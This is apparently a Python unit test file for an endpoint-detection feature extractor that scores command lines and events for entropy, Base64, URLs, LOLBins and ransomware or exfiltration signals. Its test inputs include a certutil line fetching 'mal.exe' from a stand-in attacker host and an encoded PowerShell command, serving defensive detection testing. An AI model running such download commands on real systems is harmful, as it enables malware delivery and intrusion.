# tests/test_feature_extractor.py
"""
Unit tests for parser/feature_extractor.py
"""
import unittest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from parser.feature_extractor import FeatureExtractor, FeatureRow, FeatureUtils


class TestFeatureUtils(unittest.TestCase):
    """Tests for FeatureUtils utility functions."""
    
    def test_calculate_entropy(self):
        """Test entropy calculation."""
        # Low entropy (repeated characters)
        low_entropy = FeatureUtils.calculate_entropy("aaaaaaaa")
        self.assertLess(low_entropy, 1.0)
        
        # Higher entropy (random-looking)
        high_entropy = FeatureUtils.calculate_entropy("x7K9mQ2pL5vN8wR4tY6u")
        self.assertGreater(high_entropy, 3.0)
    
    def test_detect_base64(self):
        """Test Base64 detection in command line."""
        # Base64-encoded PowerShell command
        has_base64 = FeatureUtils.detect_base64("powershell -enc d2hvYW1pYWFhYWFhYWFhYWFhYWFhYQ==")
        self.assertTrue(has_base64)
        
        # Normal command without base64
        no_base64 = FeatureUtils.detect_base64("cmd.exe /c dir")
        self.assertFalse(no_base64)
    
    def test_detect_url(self):
        """Test URL detection."""
        has_url = FeatureUtils.detect_url("certutil -urlcache http://evil.com/mal.exe")
        self.assertTrue(has_url)
        
        no_url = FeatureUtils.detect_url("notepad.exe readme.txt")
        self.assertFalse(no_url)
    
    def test_is_lolbin(self):
        """Test LOLBin detection."""
        # certutil is a LOLBin
        self.assertTrue(FeatureUtils.is_lolbin("certutil.exe"))
        
        # mshta is a LOLBin
        self.assertTrue(FeatureUtils.is_lolbin("mshta.exe"))
        
        # notepad is not a LOLBin
        self.assertFalse(FeatureUtils.is_lolbin("notepad.exe"))


class TestFeatureRow(unittest.TestCase):
    """Tests for FeatureRow dataclass."""
    
    def test_feature_names(self):
        """Test getting feature names."""
        names = FeatureRow.feature_names()
        self.assertEqual(len(names), 25)
        self.assertIn("cmdline_entropy", names)
        self.assertIn("cmdline_has_base64", names)
    
    def test_to_ml_features(self):
        """Test extracting ML features as list."""
        # Create a minimal FeatureRow
        row = FeatureRow(
            timestamp="2024-01-01T00:00:00",
            host_hash="test_host",
            process_name="cmd.exe",
            parent_process="explorer.exe",
            cmdline_entropy=3.5,
            cmdline_length=50,
            cmdline_has_base64=0,
            cmdline_has_url=0,
            is_unusual_path=0,
            is_lolbin=0,
            outbound_bytes_5m=0,
            outbound_bytes_1hr=0,
            unique_dst_ips_5m=0,
            unique_dst_ips_1hr=0,
            unique_dst_ports_1hr=0,
            dns_query_count_5m=0,
            dns_txt_query_count=0,
            rare_port_connections=0,
            periodic_connection_score=0.0,
            file_write_rate_1m=0.0,
            file_write_rate_5m=0.0,
            file_rename_count_5m=0,
            unique_extensions_written=0,
            encryption_indicator=0.0,
            failed_logons_10m=0,
            failed_logons_1hr=0,
            unique_failed_users_1hr=0,
            remote_logon_count=0,
            new_admin_indicator=0,
            ransomware_score=0.0,
            exfil_score=0.0,
            c2_beacon_score=0.0,
            lateral_movement_score=0.0,
            event_count=1,
            primary_event_type="process_create"
        )
        
        features = row.to_ml_features()
        self.assertEqual(len(features), 25)
        self.assertEqual(features[0], 3.5)  # cmdline_entropy


class TestFeatureExtractor(unittest.TestCase):
    """Tests for FeatureExtractor class."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.extractor = FeatureExtractor()
    
    def test_initialization(self):
        """Test extractor initializes correctly."""
        self.assertIsNotNone(self.extractor)
        self.assertIsNotNone(self.extractor.aggregator)


if __name__ == "__main__":
    unittest.main()
